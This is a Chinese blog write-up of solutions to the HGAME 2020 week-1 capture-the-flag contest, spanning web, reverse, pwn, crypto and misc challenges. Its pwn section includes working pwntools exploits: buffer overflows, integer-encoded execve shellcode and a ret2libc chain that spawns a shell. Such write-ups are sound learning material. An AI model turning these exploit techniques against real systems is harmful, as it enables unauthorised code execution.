---
layout:     post
title:      hgame week1
subtitle:   write up
date:       2020-02-16
author:     X1ng
header-img: week1.jpg
catalog: true
tags:
    - hgame
    - wp


---
![logo](https://tva1.sinaimg.cn/large/0082zybpgy1gby40chf8qj317c0gwdxc.jpg)

这个寒假参加了hgame，学到了不少东西，各位出题的学长辛苦了

只更新week1了我做出来的，更换了部分题目文件地址，其他wp请参考官方wp（又菜又懒，只有week1才能做做其他方向的题，week2以后的就不更了

# Web

![题目](https://tva1.sinaimg.cn/large/0082zybpgy1gbx4iqhcsgj31mg0fct94.jpg)

### 街头霸王

> 描述
>
> HGAME Re:Dive 开服啦~
>
> **题目已修改。规范了请求方式，请注意！**
>
> 题目地址 [http://kyaru.hgame.n3ko.co/](http://kyaru.hgame.n3ko.co/)
>
> 基准分数 100
>
> 当前分数 100
>
> 完成人数 307

打开题目地址

![题目](https://tva1.sinaimg.cn/large/0082zybpgy1gbxe14x9pkj31160u07hb.jpg)

burp抓包

![burp](https://tva1.sinaimg.cn/large/0082zybpgy1gbxe5q2zeej30iz0lj3yz.jpg)

根据提示添加各种请求头

![添加请求头](https://tva1.sinaimg.cn/large/0082zybpgy1gbxems8yatj30sc162q9h.jpg)

返回flag

### Code World

>描述
>
>Code is exciting!
>参数a的提交格式为: 两数相加(a=b+c)
>
>题目地址 [http://codeworld.hgame.day-day.work](http://codeworld.hgame.day-day.work/)
>
>基准分数 100
>
>当前分数 100
>
>完成人数 245

打开题目地址

![题目](https://tva1.sinaimg.cn/large/0082zybpgy1gbxetr55t3j314s0podka.jpg)

查看源代码能看到提示，应该是网页设置了自动跳转

用burp抓包,405

![burp](https://tva1.sinaimg.cn/large/0082zybpgy1gbxezf2gizj31370u0jvx.jpg)

修改请求为POST

![POST](https://tva1.sinaimg.cn/large/0082zybpgy1gbxf7e20mlj31540s00wb.jpg)

看到题目要求通过url提交参数

![提交参数](https://tva1.sinaimg.cn/large/0082zybpgy1gbxfbs1vg8j30xw0u010b.jpg)

发现+号似乎被过滤了

![url编码](https://tva1.sinaimg.cn/large/0082zybpgy1gbxfdpryttj311h0u0439.jpg)

url编码加号，得到flag

### 🐔尼太枚

>描述
>
>听说你球技高超？
>
>题目地址 [http://cxk.hgame.wz22.cc](http://cxk.hgame.wz22.cc/)
>
>基准分数 100
>
>当前分数 100
>
>完成人数 302

打开发现是cxk打篮球的小游戏

![题目](https://tva1.sinaimg.cn/large/0082zybpgy1gbxfj9zskdj313q0u0k11.jpg)

用burp修改分数，得到flag

![burp](https://tva1.sinaimg.cn/large/0082zybpgy1gbxfp9toxxj314e0su0wi.jpg)

# Reverse

![re](https://tva1.sinaimg.cn/large/0082zybpgy1gbxha20as6j31ly0dqdg2.jpg)

### maze

>描述
>
>You won't figure out anything if you give in to fear.
>
>学习资料: [https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/](https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/)
>
>附加说明：请走最短路线
>
>题目地址 链接:https://pan.baidu.com/s/1I4GhZXEKENtTkYFMea_sOA  密码:dflk
>
>基准分数 100
>
>当前分数 100
>
>完成人数 124

用ida64打开

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxfvqp3izj31560qi7e6.jpg)

发现是在内存中一步走四格字节，如果走到地图外或者走到存放奇数的内存则死亡

将内存导出后按照规律拼出地图

![地图](https://tva1.sinaimg.cn/large/0082zybpgy1gbxfyw2z1vj30nu0mmq6a.jpg)

走出迷宫，输入的字符串加上flag格式就是flag

### bitwise_operation2

>描述
>
>还记得第三次C语言培训的作业“位运算”吗？这是2.0
>
>学习资料：[http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png](http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png)
>
>题目地址 链接:https://pan.baidu.com/s/1nQYJnvPwZCNWAnfmmJiEwQ  密码:vfls
>
>基准分数 150
>
>当前分数 150
>
>完成人数 76

用ida64打开

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxg85hhd3j31580jeaip.jpg)

进入change（修改后的函数名）函数

![函数](https://tva1.sinaimg.cn/large/0082zybpgy1gbxpvvfu83j315e0j27bo.jpg)

虽然看不懂，但是还好有gdb

直接动调一下

![gdb](https://tva1.sinaimg.cn/large/0082zybpgy1gbxgfgls1pj313g08e772.jpg)

![gdb](https://tva1.sinaimg.cn/large/0082zybpgy1gbxgg1cpj9j30zu0u0anl.jpg)

这个函数会把输入的字符数据两个字节一组倒序转化成16进制数，所以输入的字符中只能含0～f

由于内存中数据是小段序存放的，所以这样处理后存放在内存中相当于正序输入字符

接下来就是后面这一堆逆运算和后面的异或了

经过分析写出后面位运算部分和异或的逆运算的python脚本（原来要逆运算这一堆位运算就是他本身- -

```python
ezlife=['E','a','s','y','l','i','f','3']  
ezre=['e','4','s','y','_','R','e','_']					#用ida查看异或结果匹配的字符串  

newre=[]  
newlife=[]  
v6 = [0x4c,0x3c,0xd6,0x36,0x50,0x88,0x20,0xcc]	        #用ida查看变量v6的值

for ez in ezre:
    newre.append(ord(ez))
for ez in ezlife:
    newlife.append(ord(ez))

result1=[]
result2=[]
for a,b in zip(newre,v6):
    a ^= b
    result1.append(a)
for a,b in zip(newlife,result1):
    a ^= b
    result2.append(a)

part1=[]
part2=[]
result2.reverse()
for a,b in zip(result1,result2):

    a = (a & 0x55) ^ ((b & 0xaa) >>1) | a & 0xaa
    b = 2 * (a & 0x55) ^ b & 0xaa | b & 0x55
    a = a & 0x55 ^ ((b & 0xaa) >>1) | a & 0xaa

    a = ((a & 7) << 5) | ((a & 248) >> 3)
    part1.append(a)
    part2.append(b)
part2.reverse()

for i in part1:
    print(hex(i))
for i in part2:
    print(hex(i))
```

憋足脚本2333，，，得到flag

# Pwn

![pwn](https://tva1.sinaimg.cn/large/0082zybpgy1gbxhar2n23j31mc0eomxi.jpg)

### Hard_AAAAA

> 描述
>
> 无脑AAA太无聊了，挑战更高难度的无脑AAA！
>
> nc 47.103.214.163 20000
>
> 题目地址 链接:https://pan.baidu.com/s/19SbtWLIt8gdzpwlbOjfbwQ  密码:sxdq
>
> 基准分数 75
>
> 当前分数 75
>
> 完成人数 173

例行检查

![checksec](https://tva1.sinaimg.cn/large/0082zybpgy1gbxhn8wxhij30u808sdjh.jpg)

用ida打开

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxho4q50xj310s0h0gq4.jpg)

覆盖变量为特定内容控制程序执行后门函数即可

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxhpj3qcwj313k05s76m.jpg)

写exp

```python
#!/usr/bin/env python2 

# -*- coding: utf-8 -*-  

from pwn import *  

p = process('./aaa')
#p = remote("47.103.214.163",  20001)

p.recvuntil('0O0!\n')
payload = 'a'*123+'0O0o'+'\0'+'O0'

p.send(payload)


p.interactive()

```

### Number_Killer

>描述
>
>看起来人畜无害的一些整数也能秒我？(吃惊)
>
>nc 47.103.214.163 20001
>
>题目地址 链接:https://pan.baidu.com/s/1Lpu5XWSz-_cloWBtWJ5Fzg  密码:cpdj
>
>基准分数 100
>
>当前分数 100
>
>完成人数 77

例行检查

![checksec](https://tva1.sinaimg.cn/large/0082zybpgy1gbxhvqviflj30x608g0vr.jpg)

发现并没有什么保护

用ida64打开

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxhx70tsaj31580fmwi7.jpg)

进入readll函数

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxhximboqj31580hu0x0.jpg)

atoll函数可以将字符转成long long int，程序没用nx保护而且可以写入很多字符，推测应该要用shellcode

而且函数中有一个gift可以直接跳转到rsp，只要让程序返回的时候rsp指向shellcode起始地址，就可以执行shellcode

![gdb](https://tva1.sinaimg.cn/large/0082zybpgy1gbxi0vjxf9j315a0amaff.jpg)

然而由于atoll函数只会把数字存入内存，所以想到可能需要shellcode编码

py了一下**@幼稚园**学长以后得到学长的hint，内存的本质都是机械码，所以可以直接将机械码传入

最菜的人只能用最笨的方法

![python](https://tva1.sinaimg.cn/large/0082zybpgy1gbxi3a8el0j3158046tb9.jpg)

但是有几段数字太大超过了long long int范围，py了一下出题人**@cosmos**又得到hint可以用负数代替

可以写exp了

```python
#!/usr/bin/env python2  

# -*- coding: utf-8 -*-  

from pwn import *

p = process('./num')
#p = remote("47.103.214.163",  20001)

gdb.attach(p,'b *0x4006DA')

jmp_rsp = '4196237'  #0x40078D

over = '51539607552' #0xc00000000

p.recvuntil('numbers!\n')


payload = '1'+p8(0xa)+'2'+p8(0xa)+'3'+p8(0xa)+'4'+p8(0xa)+'5'+p8(0xa)+'6'+p8(0xa)
payload += '1'+p8(0xa)+'2'+p8(0xa)+'3'+p8(0xa)+'4'+p8(0xa)
payload += '3'+p8(0xa)+over+p8(0xa)+jmp_rsp+p8(0xa)
payload += '7955998173821429866'+p8(0xa)+'-1762798268771782865'+p8(0xa)  
payload += '2608851925472997992'+p8(0xa)+'7662582506348151041'+p8(0xa)
payload += '-8554491946326270456'+p8(0xa)+'364607107058774502'+p8(0xa)   

p.send(payload)

p.interactive()


#'jhH\xb8/bin'

#'///sPH\x89\xe7' -> 16683945804937768751 -> -1762798268771782865

#'hri\x01\x01\x814$'

#'\x01\x01\x01\x011\xf6Vj'

#'\x08^H\x01\xe6VH\x89' -> 9892252127383281160 -> -8554491946326270456

#'\xe61\xd2j;X\x0f\x05'

```

其中有一段需要覆盖的内存里存放循环次数（还关系到需要覆盖的地址），填充的时候需注意，需用0xc00000000覆盖使下次存入的地址覆盖返回地址

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxls8n8laj311c0cidl5.jpg)

![gdb](https://tva1.sinaimg.cn/large/0082zybpgy1gbxlmtx6qbj315k0i40zt.jpg)

### One_Shot

>描述
>
>一发入魂
>
>nc 47.103.214.163 20002
>
>题目地址 链接:https://pan.baidu.com/s/1FFZ9GdYNm26bZ5YoLJRFgQ  密码:42z0
>
>基准分数 100
>
>当前分数 100
>
>完成人数 121

例行检查

![checksec](https://tva1.sinaimg.cn/large/0082zybpgy1gbxm6c0kwaj30xm08gjv5.jpg)

用ida64打开

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxm97xrnbj315i0nkaiw.jpg)

可以看出flag已经存在内存中

后面有一个把指定地址的内容写为1的操作

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxmew547dj315e0kodq2.jpg)

可以将flag前一段name的末位\0修改，在打印name的时候将flag打印出来

写exp

```python
#!/usr/bin/env python2  

# -*- coding: utf-8 -*-  

from pwn import *

p = process('./one')
#p = remote("47.103.214.163",  20002)

gdb.attach(p,'b *0x04007FB')

p.recvuntil('name?\n')
p.sendline('a'*32)
p.recvuntil('one shot!\n')
p.sendline('6295776')

p.interactive()

```

### ROP_LEVEL0

>描述
>
>ROP is PWNers' romance
>nc 47.103.214.163 20003
>
>题目地址 链接:https://pan.baidu.com/s/1Eh_CXYKHKDOtxgRGhKF2Wg  密码:l96z
>
>基准分数 150
>
>当前分数 150
>
>完成人数 88

例行检查

![checksec](https://tva1.sinaimg.cn/large/0082zybpgy1gbxmqpqjlij30xe074dip.jpg)

看到没有后门程序，就想到了ret2libc（然而并不是预期解

用ida64打开

![ida](https://tva1.sinaimg.cn/large/0082zybpgy1gbxmry5oi0j315e0nw0zp.jpg)

找到合适的gadget

![gadget](https://tva1.sinaimg.cn/large/0082zybpgy1gbxmtis3qxj311i01q3zt.jpg)

覆盖返回地址到pop rdi，puts泄露libc一个函数真实地址，再计算libc地址，就可以得到system和/bin/sh地址了

写exp，用libcseacher直接计算偏移，再让程序返回main函数，再次覆盖返回地址，getshell

```python
#!/usr/bin/env python2  
# -*- coding: utf-8 -*-  
from pwn import *
from LibcSearcher import *

elf = ELF('./rop')
p = process('./rop')
#p = remote("47.103.214.163", 20003)
gdb.attach(p,'b *0x400540')

poprdi=0x400753
puts=elf.plt['puts']
puts_got=elf.got['puts']


p.recvuntil('\n')
payload = 'a'*88+p64(poprdi)+p64(puts_got)+p64(puts)
payload += p64(0x40065B)

p.sendline(payload)

puts=u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher("puts", puts)

libcbase=puts-libc.dump('puts')
system_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

payload = 'a'*88+p64(poprdi)+p64(bin_sh)+p64(system_addr)
p.recvuntil('\n')
p.sendline(payload)

p.interactive()
```

# Crypto

![题目](https://tva1.sinaimg.cn/large/0082zybpgy1gbxmyyn6brj31ly0emmxe.jpg)

### InfantRSA

>描述
>
>真*签到题
>
>p = 681782737450022065655472455411;
>
>q = 675274897132088253519831953441;
>
>e = 13;
>
>c = pow(m,e,p*q) = 275698465082361070145173688411496311542172902608559859019841
>
>题目地址 [https://paste.ubuntu.com/p/9hVzhnxqPc/](https://paste.ubuntu.com/p/9hVzhnxqPc/)
>
>基准分数 50
>
>当前分数 50
>
>完成人数 194

根据题目描述用python脚本计算

```python
def rsa_get_d(e, euler):
    k = 1
    while True:
        if (((euler * k) + 1) % e) == 0:
            return (euler * k + 1) // e
        k += 1

e=13
euler=675274897132088253519831953440*681782737450022065655472455410
d = rsa_get_d(e, euler)

c = 275698465082361070145173688411496311542172902608559859019841
n = 675274897132088253519831953441*681782737450022065655472455411
m = pow(c,d,n)
print(hex(m))

```

再将输出的十六进制转成字符串，得到flag

### Reorder

>描述
>
>We found a secret oracle and it looks like it will encrypt your input…
>
>nc 0 1234
>
>题目地址 [https://www.baidu.com](https://www.baidu.com/)
>
>基准分数 75
>
>当前分数 75
>
>完成人数 94

nc连接发现会把输入的字符打乱，直接回车会弹出可疑字符(诸如h,g,a,m,e,{,},...)，应该是flag按一定顺序打乱

![crypto](https://tva1.sinaimg.cn/large/0082zybpgy1gbxn9neyibj30m6060ac5.jpg)

对照自己输入的字符被打乱的顺序重组得到flag

# Misc

![题目](https://tva1.sinaimg.cn/large/0082zybpgy1gbxncw6vosj31lw0gyt95.jpg)

### 欢迎参加HGame！

>描述
>
>欢迎大家参加 HGAME 2020！
>来来来，签个到吧～
>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0g
>Li4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t
>注：若解题得到的是无`hgame{}`字样的flag花括号内内容，请手动添加`hgame{}`后提交。
>【Notice】解出来的字母均为大写
>
>题目地址 [https://www.baidu.com](https://www.baidu.com/)
>
>基准分数 50
>
>当前分数 50
>
>完成人数 448

将题目描述的奇怪字符串用base64解密一下

![base64](https://tva1.sinaimg.cn/large/0082zybpgy1gbxnqdtquaj312y0nq0vs.jpg)

对照摩尔斯电码表解密得到flag

### 壁纸

>描述
>
>某天，ObjectNotFound给你发来了一个压缩包。
>“给你一张我的新老婆的壁纸！怎样，好看吗？”
>正当你疑惑不解的时候，你突然注意到了压缩文件的名字——“Secret”。
>莫非其中暗藏玄机？
>
>题目地址 [http://oss-east.zhouweitong.site/hgame2020/week1/Secret_QsqPlFOPp8urcgwTszHT06HmsGYetoGy.zip](http://oss-east.zhouweitong.site/hgame2020/week1/Secret_QsqPlFOPp8urcgwTszHT06HmsGYetoGy.zip)
>
>基准分数 75
>
>当前分数 75
>
>完成人数 314

用7z解压题目文件

![解压](https://tva1.sinaimg.cn/large/0082zybpgy1gbxntj3r58j314m0mugpp.jpg)

用010editor打开图片文件发现里面还有一个压缩文件，后面提示密码是图片id

![010](https://tva1.sinaimg.cn/large/0082zybpgy1gbxnttifgoj315e0ki4aw.jpg)

导出得到zip文件

在[http://saucenao.com](http://jump2.bdimg.com/safecheck/index?url=x+Z5mMbGPAvDGiHzmC13lPbAPOqfUqHtUOMOnBxS935a6mQ2UaAXeUQQbuItlrayi3mt9L/lRF/bZJFR3Sc/DMjehmM9RXP7ui7ccWnYzDS94qZWpXblL3nPwGfiBcHEMDxm7iZ2BjQ=)网站搜索图片id作为zip文件密码

![id](https://tva1.sinaimg.cn/large/0082zybpgy1gbxo3q8o4lj315g0lu7e3.jpg)

解压zip得到flag.txt

![flag](https://tva1.sinaimg.cn/large/0082zybpgy1gbxo3rynczj315e098wgu.jpg)

在\u和数字间加上00 写成unicode编码格式，在线网站解码得到flag
